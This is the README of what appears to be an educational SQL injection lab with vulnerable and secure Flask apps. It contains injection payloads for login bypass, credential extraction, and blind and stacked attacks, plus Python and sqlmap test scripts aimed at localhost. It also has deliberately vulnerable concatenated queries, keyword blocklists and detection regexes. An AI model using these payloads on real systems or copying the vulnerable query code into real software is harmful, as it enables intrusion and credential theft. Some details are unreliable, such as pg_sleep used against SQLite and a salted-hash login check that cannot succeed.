# SQL Defence Playground

Interactive laboratory environment for learning SQL injection vulnerabilities and implementing secure database practices. This playground provides both vulnerable and secure versions of a web application for hands-on security testing.

## Overview

This project demonstrates common SQL injection vulnerabilities and their prevention techniques through a practical web application. It's designed for security professionals, developers, and students to understand SQL injection attacks and learn secure coding practices.

## Features

- **Vulnerable Application** - Intentionally insecure for testing
- **Secure Implementation** - Best practices demonstration
- **Multiple Attack Vectors** - Various SQL injection techniques
- **Interactive Testing** - Web-based vulnerability exploration
- **Educational Content** - Detailed explanations and examples
- **Security Tools** - Automated testing and validation

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    SQL Defence Playground                   │
│                                                             │
│  ┌─────────────────┐    ┌─────────────────┐               │
│  │   Vulnerable    │    │     Secure      │               │
│  │   Application   │    │   Application   │               │
│  │                 │    │                 │               │
│  │ • No validation │    │ • Input validation│             │
│  │ • String concat │    │ • Parameterized  │             │
│  │ • Error exposure│    │ • Error handling │             │
│  └─────────────────┘    └─────────────────┘               │
│           │                       │                       │
│           ▼                       ▼                       │
│  ┌─────────────────────────────────────────────────────────┐ │
│  │                SQLite Database                          │ │
│  │                                                         │ │
│  │ • Users table                                          │ │
│  │ • Products table                                       │ │
│  │ • Orders table                                         │ │
│  │ • Audit logs                                           │ │
│  └─────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

## Installation

### Prerequisites
```bash
# Python 3.8+
python3 --version

# Required packages
pip install flask sqlite3 hashlib bcrypt
```

### Quick Setup
```bash
# Clone the repository
git clone https://github.com/giovannide/Digital-Forge.git
cd Digital-Forge/3-Data-Analytics/Data-Protection/sql-defence-playground

# Install dependencies
pip install -r requirements.txt

# Initialize database
python setup_database.py

# Start vulnerable application
python vulnerable_app.py

# Start secure application (in another terminal)
python secure_app.py
```

### Docker Setup
```bash
# Build container
docker build -t sql-defence-playground .

# Run vulnerable app
docker run -p 5000:5000 sql-defence-playground python vulnerable_app.py

# Run secure app
docker run -p 5001:5001 sql-defence-playground python secure_app.py
```

## Usage

### Accessing Applications

#### Vulnerable Application
- **URL**: http://localhost:5000
- **Purpose**: Testing SQL injection vulnerabilities
- **Warning**: ⚠️ Intentionally insecure - do not use in production

#### Secure Application
- **URL**: http://localhost:5001
- **Purpose**: Demonstrating secure implementation
- **Features**: Input validation, parameterized queries, error handling

### Testing Scenarios

#### 1. Authentication Bypass
```sql
-- Test in login form
Username: admin' OR '1'='1' --
Password: anything

-- Expected: Bypass authentication in vulnerable app
-- Expected: Login failure in secure app
```

#### 2. Data Extraction
```sql
-- Test in search field
Search: ' UNION SELECT username, password FROM users --

-- Expected: Expose user data in vulnerable app
-- Expected: No data exposure in secure app
```

#### 3. Blind SQL Injection
```sql
-- Test with timing attacks
Search: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --

-- Expected: Delayed response in vulnerable app
-- Expected: Normal response in secure app
```

#### 4. Error-based Injection
```sql
-- Test error information disclosure
Search: ' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --

-- Expected: Database error in vulnerable app
-- Expected: Generic error in secure app
```

## Vulnerability Examples

### 1. Classic SQL Injection

#### Vulnerable Code
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # VULNERABLE: Direct string concatenation
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    
    cursor.execute(query)
    user = cursor.fetchone()
    
    if user:
        return "Login successful!"
    else:
        return "Login failed!"
```

#### Secure Code
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Input validation
    if not validate_input(username) or not validate_input(password):
        return "Invalid input", 400
    
    # SECURE: Parameterized query
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    
    cursor.execute(query, (username, hash_password(password)))
    user = cursor.fetchone()
    
    if user:
        return "Login successful!"
    else:
        return "Login failed!"

def validate_input(input_string):
    """Validate input to prevent malicious content"""
    if not input_string or len(input_string) > 100:
        return False
    
    # Check for SQL injection patterns
    dangerous_patterns = [
        "'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_',
        'union', 'select', 'insert', 'update', 'delete',
        'drop', 'create', 'alter', 'exec', 'execute'
    ]
    
    input_lower = input_string.lower()
    for pattern in dangerous_patterns:
        if pattern in input_lower:
            return False
    
    return True

def hash_password(password):
    """Securely hash password"""
    import bcrypt
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
```

### 2. Union-based Injection

#### Vulnerable Code
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    
    # VULNERABLE: No input validation
    sql = f"SELECT name, description FROM products WHERE name LIKE '%{query}%'"
    
    cursor.execute(sql)
    results = cursor.fetchall()
    
    return render_template('results.html', results=results)
```

#### Attack Example
```
/search?q=' UNION SELECT username, password FROM users --
```

#### Secure Code
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    
    # Input validation and sanitization
    if not query or len(query) > 50:
        return "Invalid search query", 400
    
    # Remove dangerous characters
    query = sanitize_input(query)
    
    # SECURE: Parameterized query with limited columns
    sql = "SELECT name, description FROM products WHERE name LIKE ? LIMIT 100"
    
    cursor.execute(sql, (f'%{query}%',))
    results = cursor.fetchall()
    
    return render_template('results.html', results=results)

def sanitize_input(input_string):
    """Sanitize input by removing dangerous characters"""
    import re
    # Remove SQL metacharacters
    sanitized = re.sub(r"[';\"\\]", "", input_string)
    return sanitized.strip()
```

### 3. Blind SQL Injection

#### Vulnerable Code
```python
@app.route('/user/<int:user_id>')
def get_user(user_id):
    # VULNERABLE: Direct parameter usage
    query = f"SELECT * FROM users WHERE id = {user_id}"
    
    cursor.execute(query)
    user = cursor.fetchone()
    
    if user:
        return jsonify({"exists": True})
    else:
        return jsonify({"exists": False})
```

#### Attack Example
```
/user/1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin%') > 0
```

#### Secure Code
```python
@app.route('/user/<int:user_id>')
def get_user(user_id):
    # Input validation
    if not isinstance(user_id, int) or user_id < 1:
        return "Invalid user ID", 400
    
    # SECURE: Parameterized query
    query = "SELECT id, username, email FROM users WHERE id = ?"
    
    cursor.execute(query, (user_id,))
    user = cursor.fetchone()
    
    if user:
        return jsonify({
            "id": user[0],
            "username": user[1],
            "email": user[2]
        })
    else:
        return jsonify({"error": "User not found"}), 404
```

## Security Testing Tools

### Manual Testing Checklist
```python
# test_checklist.py
"""
SQL Injection Testing Checklist
"""

test_cases = [
    # Authentication bypass
    {"input": "admin' OR '1'='1' --", "type": "auth_bypass"},
    {"input": "admin' OR 1=1 #", "type": "auth_bypass"},
    
    # Union-based injection
    {"input": "' UNION SELECT null, username, password FROM users --", "type": "union"},
    {"input": "' UNION SELECT 1,2,3,4,5 --", "type": "union_columns"},
    
    # Boolean-based blind injection
    {"input": "1' AND '1'='1", "type": "blind_boolean"},
    {"input": "1' AND '1'='2", "type": "blind_boolean"},
    
    # Time-based blind injection
    {"input": "1'; WAITFOR DELAY '00:00:05' --", "type": "blind_time"},
    {"input": "1' AND (SELECT COUNT(*) FROM users) > 0 --", "type": "blind_time"},
    
    # Error-based injection
    {"input": "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --", "type": "error_based"},
    
    # Second-order injection
    {"input": "admin'; INSERT INTO users VALUES ('hacker', 'password'); --", "type": "second_order"}
]

def run_tests(base_url):
    """Run SQL injection tests against target application"""
    import requests
    
    results = []
    
    for test in test_cases:
        try:
            # Test login endpoint
            response = requests.post(f"{base_url}/login", data={
                "username": test["input"],
                "password": "test"
            })
            
            results.append({
                "test_type": test["type"],
                "input": test["input"],
                "status_code": response.status_code,
                "response_length": len(response.text),
                "vulnerable": "Login successful" in response.text
            })
            
        except Exception as e:
            results.append({
                "test_type": test["type"],
                "input": test["input"],
                "error": str(e)
            })
    
    return results

if __name__ == "__main__":
    # Test vulnerable application
    print("Testing vulnerable application...")
    vuln_results = run_tests("http://localhost:5000")
    
    # Test secure application
    print("Testing secure application...")
    secure_results = run_tests("http://localhost:5001")
    
    # Compare results
    print("\n=== VULNERABILITY COMPARISON ===")
    for i, (vuln, secure) in enumerate(zip(vuln_results, secure_results)):
        print(f"Test {i+1}: {vuln['test_type']}")
        print(f"  Vulnerable app: {'VULNERABLE' if vuln.get('vulnerable') else 'SECURE'}")
        print(f"  Secure app: {'VULNERABLE' if secure.get('vulnerable') else 'SECURE'}")
        print()
```

### Automated Testing with SQLMap
```bash
# Test vulnerable application
sqlmap -u "http://localhost:5000/search?q=test" --batch --dbs

# Test login form
sqlmap -u "http://localhost:5000/login" --data="username=test&password=test" --batch

# Test with cookies
sqlmap -u "http://localhost:5000/profile" --cookie="session=abc123" --batch

# Test secure application (should show no vulnerabilities)
sqlmap -u "http://localhost:5001/search?q=test" --batch --dbs
```

### Custom Testing Script
```python
# automated_test.py
import requests
import time
import json

class SQLInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        payloads = [
            "admin' OR '1'='1' --",
            "admin' OR 1=1 #",
            "' OR ''='",
            "admin'/**/OR/**/1=1--",
            "admin' UNION SELECT 1 --"
        ]
        
        results = []
        for payload in payloads:
            response = self.session.post(f"{self.base_url}/login", data={
                "username": payload,
                "password": "test"
            })
            
            vulnerable = "Login successful" in response.text or response.status_code == 200
            results.append({
                "payload": payload,
                "vulnerable": vulnerable,
                "response_code": response.status_code
            })
        
        return results
    
    def test_union_injection(self):
        """Test for UNION-based SQL injection"""
        # First, determine number of columns
        column_tests = []
        for i in range(1, 10):
            payload = f"' UNION SELECT {','.join(['NULL'] * i)} --"
            response = self.session.get(f"{self.base_url}/search", params={"q": payload})
            
            if response.status_code == 200 and "error" not in response.text.lower():
                column_tests.append(i)
        
        if column_tests:
            # Test data extraction
            columns = column_tests[0]
            payloads = [
                f"' UNION SELECT {','.join(['username'] + ['NULL'] * (columns-1))} FROM users --",
                f"' UNION SELECT {','.join(['password'] + ['NULL'] * (columns-1))} FROM users --",
                f"' UNION SELECT {','.join(['version()'] + ['NULL'] * (columns-1))} --"
            ]
            
            results = []
            for payload in payloads:
                response = self.session.get(f"{self.base_url}/search", params={"q": payload})
                results.append({
                    "payload": payload,
                    "response_length": len(response.text),
                    "status_code": response.status_code
                })
            
            return results
        
        return []
    
    def test_blind_injection(self):
        """Test for blind SQL injection"""
        # Boolean-based blind injection
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"
        
        true_response = self.session.get(f"{self.base_url}/search", params={"q": true_payload})
        false_response = self.session.get(f"{self.base_url}/search", params={"q": false_payload})
        
        # Time-based blind injection
        start_time = time.time()
        time_payload = "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END --"
        time_response = self.session.get(f"{self.base_url}/search", params={"q": time_payload})
        end_time = time.time()
        
        return {
            "boolean_blind": len(true_response.text) != len(false_response.text),
            "time_blind": (end_time - start_time) > 2,
            "response_time": end_time - start_time
        }
    
    def generate_report(self):
        """Generate comprehensive test report"""
        report = {
            "target": self.base_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "tests": {}
        }
        
        print(f"Testing {self.base_url}...")
        
        # Run all tests
        report["tests"]["authentication_bypass"] = self.test_authentication_bypass()
        report["tests"]["union_injection"] = self.test_union_injection()
        report["tests"]["blind_injection"] = self.test_blind_injection()
        
        # Calculate vulnerability score
        vulnerabilities = 0
        total_tests = 0
        
        for test_type, results in report["tests"].items():
            if isinstance(results, list):
                for result in results:
                    total_tests += 1
                    if result.get("vulnerable"):
                        vulnerabilities += 1
            elif isinstance(results, dict):
                for key, value in results.items():
                    if isinstance(value, bool):
                        total_tests += 1
                        if value:
                            vulnerabilities += 1
        
        report["vulnerability_score"] = (vulnerabilities / total_tests * 100) if total_tests > 0 else 0
        report["risk_level"] = self.calculate_risk_level(report["vulnerability_score"])
        
        return report
    
    def calculate_risk_level(self, score):
        """Calculate risk level based on vulnerability score"""
        if score >= 75:
            return "CRITICAL"
        elif score >= 50:
            return "HIGH"
        elif score >= 25:
            return "MEDIUM"
        elif score > 0:
            return "LOW"
        else:
            return "SECURE"

if __name__ == "__main__":
    # Test both applications
    vulnerable_tester = SQLInjectionTester("http://localhost:5000")
    secure_tester = SQLInjectionTester("http://localhost:5001")
    
    print("=== SQL INJECTION SECURITY ASSESSMENT ===\n")
    
    # Generate reports
    vuln_report = vulnerable_tester.generate_report()
    secure_report = secure_tester.generate_report()
    
    # Display results
    print(f"Vulnerable Application:")
    print(f"  Vulnerability Score: {vuln_report['vulnerability_score']:.1f}%")
    print(f"  Risk Level: {vuln_report['risk_level']}")
    print()
    
    print(f"Secure Application:")
    print(f"  Vulnerability Score: {secure_report['vulnerability_score']:.1f}%")
    print(f"  Risk Level: {secure_report['risk_level']}")
    print()
    
    # Save detailed reports
    with open("vulnerability_report.json", "w") as f:
        json.dump({
            "vulnerable_app": vuln_report,
            "secure_app": secure_report
        }, f, indent=2)
    
    print("Detailed report saved to vulnerability_report.json")
```

## Educational Content

### Learning Modules

#### Module 1: Understanding SQL Injection
- **Theory**: How SQL injection works
- **Practice**: Identifying vulnerable code
- **Lab**: Exploiting basic SQL injection
- **Assessment**: Vulnerability identification quiz

#### Module 2: Attack Techniques
- **Union-based Injection**: Data extraction methods
- **Blind Injection**: Inference-based attacks
- **Error-based Injection**: Information disclosure
- **Time-based Injection**: Timing attack techniques

#### Module 3: Prevention Strategies
- **Parameterized Queries**: Safe database access
- **Input Validation**: Filtering malicious input
- **Output Encoding**: Preventing data exposure
- **Error Handling**: Secure error management

#### Module 4: Advanced Topics
- **Second-order Injection**: Stored payload attacks
- **NoSQL Injection**: Non-relational database attacks
- **ORM Security**: Object-relational mapping vulnerabilities
- **Database Security**: Hardening and monitoring

### Hands-on Exercises

#### Exercise 1: Basic Exploitation
```
Objective: Bypass login authentication
Target: Vulnerable application login form
Method: SQL injection in username field
Success: Access admin account without password
```

#### Exercise 2: Data Extraction
```
Objective: Extract user passwords
Target: Search functionality
Method: UNION-based SQL injection
Success: Retrieve all user credentials
```

#### Exercise 3: Blind Exploitation
```
Objective: Extract database version
Target: User profile page
Method: Boolean-based blind injection
Success: Determine database type and version
```

#### Exercise 4: Secure Implementation
```
Objective: Fix all vulnerabilities
Target: Vulnerable application code
Method: Implement security controls
Success: Pass all security tests
```

## Security Best Practices

### Input Validation
```python
def validate_sql_input(input_string, max_length=100):
    """Comprehensive input validation for SQL injection prevention"""
    
    # Check for null or empty input
    if not input_string:
        return False, "Input cannot be empty"
    
    # Check length
    if len(input_string) > max_length:
        return False, f"Input too long (max {max_length} characters)"
    
    # Check for SQL injection patterns
    dangerous_patterns = [
        # SQL keywords
        r'\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b',
        # SQL operators
        r'(\-\-|\/\*|\*\/)',
        # SQL functions
        r'\b(concat|substring|ascii|char|waitfor|delay)\b',
        # SQL metacharacters
        r"[';\"\\]"
    ]
    
    import re
    for pattern in dangerous_patterns:
        if re.search(pattern, input_string, re.IGNORECASE):
            return False, f"Potentially malicious input detected"
    
    return True, "Input is valid"

# Usage example
user_input = request.form.get('username')
is_valid, message = validate_sql_input(user_input)

if not is_valid:
    return jsonify({"error": message}), 400
```

### Parameterized Queries
```python
# Different database implementations

# SQLite
def get_user_sqlite(user_id):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
    return cursor.fetchone()

# PostgreSQL
def get_user_postgresql(user_id):
    import psycopg2
    conn = psycopg2.connect(database="mydb", user="user", password="pass")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    return cursor.fetchone()

# MySQL
def get_user_mysql(user_id):
    import mysql.connector
    conn = mysql.connector.connect(host="localhost", user="user", password="pass", database="mydb")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    return cursor.fetchone()

# SQLAlchemy ORM (recommended)
def get_user_sqlalchemy(user_id):
    from sqlalchemy.orm import sessionmaker
    Session = sessionmaker(bind=engine)
    session = Session()
    return session.query(User).filter(User.id == user_id).first()
```

### Error Handling
```python
def secure_database_operation(query, params):
    """Secure database operation with proper error handling"""
    try:
        cursor.execute(query, params)
        return cursor.fetchall()
    
    except sqlite3.Error as e:
        # Log detailed error for debugging
        logger.error(f"Database error: {e}")
        
        # Return generic error to user
        raise Exception("Database operation failed")
    
    except Exception as e:
        # Log unexpected errors
        logger.error(f"Unexpected error: {e}")
        
        # Return generic error
        raise Exception("An error occurred")

# Usage with proper exception handling
@app.route('/api/users/<int:user_id>')
def get_user_api(user_id):
    try:
        result = secure_database_operation(
            "SELECT id, username, email FROM users WHERE id = ?",
            (user_id,)
        )
        
        if result:
            return jsonify(result[0])
        else:
            return jsonify({"error": "User not found"}), 404
    
    except Exception as e:
        return jsonify({"error": "Internal server error"}), 500
```

## Deployment and Production

### Security Configuration
```python
# config.py
import os

class SecurityConfig:
    # Database security
    DATABASE_URL = os.environ.get('DATABASE_URL')
    DATABASE_POOL_SIZE = 10
    DATABASE_POOL_TIMEOUT = 30
    
    # Input validation
    MAX_INPUT_LENGTH = 100
    ENABLE_INPUT_SANITIZATION = True
    STRICT_VALIDATION = True
    
    # Error handling
    DEBUG_MODE = False
    DETAILED_ERRORS = False
    LOG_LEVEL = 'WARNING'
    
    # Security headers
    SECURITY_HEADERS = {
        'X-Content-Type-Options': 'nosniff',
        'X-Frame-Options': 'DENY',
        'X-XSS-Protection': '1; mode=block',
        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'
    }
    
    # Rate limiting
    RATE_LIMIT_ENABLED = True
    RATE_LIMIT_REQUESTS = 100
    RATE_LIMIT_WINDOW = 3600  # 1 hour
```

### Monitoring and Alerting
```python
# monitoring.py
import logging
import time
from functools import wraps

# Configure security logging
security_logger = logging.getLogger('security')
security_handler = logging.FileHandler('security.log')
security_formatter = logging.Formatter(
    '%(asctime)s - %(levelname)s - %(message)s'
)
security_handler.setFormatter(security_formatter)
security_logger.addHandler(security_handler)
security_logger.setLevel(logging.WARNING)

def log_security_event(event_type, details, severity='WARNING'):
    """Log security events for monitoring"""
    security_logger.log(
        getattr(logging, severity),
        f"SECURITY_EVENT: {event_type} - {details}"
    )

def detect_sql_injection(func):
    """Decorator to detect potential SQL injection attempts"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        # Check request parameters for SQL injection patterns
        request_data = str(request.get_data())
        
        sql_patterns = [
            r"union.*select", r"insert.*into", r"delete.*from",
            r"update.*set", r"drop.*table", r"--", r"/\*"
        ]
        
        import re
        for pattern in sql_patterns:
            if re.search(pattern, request_data, re.IGNORECASE):
                log_security_event(
                    "SQL_INJECTION_ATTEMPT",
                    f"IP: {request.remote_addr}, Pattern: {pattern}, Data: {request_data[:100]}",
                    "CRITICAL"
                )
                
                # Optional: Block the request
                return jsonify({"error": "Request blocked"}), 403
        
        return func(*args, **kwargs)
    
    return wrapper

# Usage
@app.route('/search')
@detect_sql_injection
def search():
    # Your search logic here
    pass
```

## Contributing

See [CONTRIBUTING.md](../../../../docs/CONTRIBUTING.md) for guidelines on contributing to this project.

## License

MIT License - see [LICENSE](../../../../LICENSE) for details.

## Disclaimer

⚠️ **Educational Use Only**: This playground contains intentionally vulnerable code for educational purposes. Do not use vulnerable components in production environments. Always follow secure coding practices in real applications.